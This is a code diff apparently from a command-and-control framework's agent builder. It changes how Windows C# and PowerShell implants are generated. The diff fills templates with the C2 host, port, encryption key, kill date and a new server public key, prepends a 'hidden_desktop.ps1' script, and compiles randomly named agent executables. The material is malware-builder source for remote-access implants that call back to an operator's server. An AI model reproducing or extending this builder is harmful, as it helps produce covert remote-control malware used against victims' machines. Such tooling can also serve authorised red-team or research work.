@@ -1410,9 +1410,12 @@ def {cmd_func}(cmd):
         hd_ps = self.templates_dir / 'hidden_desktop.ps1'
         if hd_ps.exists():
             content = hd_ps.read_text() + '\n' + content
+        from crypto.handshake import ServerIdentity
+        server_pub_hex = ServerIdentity.load().pub.hex()
         content = content.replace("{{C2_HOST}}", connect_host)
         content = content.replace("{{C2_PORT}}", str(connect_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
+        content = content.replace("{{SERVER_PUB}}", server_pub_hex)
         if transport in ('http', 'https'):
             content = content.replace("{{C2_SCHEME}}", transport)
             content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
@@ -1728,6 +1731,9 @@ def {cmd_func}(cmd):
         with open(cs_src, 'r') as f:
             src = f.read()
 
+        from crypto.handshake import ServerIdentity
+        server_pub_hex = ServerIdentity.load().pub.hex()
+
         replacements = {
             '{{C2_HOST}}': c2_host, '{{C2_PORT}}': str(c2_port),
             '{{C2_SCHEME}}': scheme, '{{ENCRYPTION_KEY}}': encryption_key,
@@ -1735,15 +1741,20 @@ def {cmd_func}(cmd):
             '{{REGISTER_URI}}': uris['register'], '{{CHECKIN_URI}}': uris['checkin'],
             '{{RESULT_URI}}': uris['results'], '{{USER_AGENT}}': ua,
             '{{KILL_DATE}}': '0', '{{WORK_START}}': '0', '{{WORK_END}}': '24',
+            '{{SERVER_PUB}}': server_pub_hex,
         }
-        for k, v in replacements.items():
-            src = src.replace(k, v)
 
         import shutil
-        backup = cs_src.parent / 'Program.cs.bak'
-        shutil.copy(cs_src, backup)
-        with open(cs_src, 'w') as f:
-            f.write(src)
+        cs_files = list(cs_src.parent.glob('*.cs'))
+        backups = {}
+        for csf in cs_files:
+            src_text = csf.read_text()
+            for k, v in replacements.items():
+                src_text = src_text.replace(k, v)
+            backup_path = csf.with_suffix('.cs.bak')
+            shutil.copy(csf, backup_path)
+            backups[csf] = backup_path
+            csf.write_text(src_text)
 
         out_name = f"agent_{self.random_string(8)}_windows.exe"
         print(f"[*] Building C# agent for Windows x64 (framework-dependent)...")
@@ -1753,8 +1764,9 @@ def {cmd_func}(cmd):
             cwd=str(cs_src.parent), capture_output=True, text=True, timeout=120
         )
 
-        shutil.copy(backup, cs_src)
-        os.remove(backup)
+        for csf, bak in backups.items():
+            shutil.copy(bak, csf)
+            os.remove(bak)
 
         if result.returncode != 0:
             return f"Error: {result.stderr[:200]}"
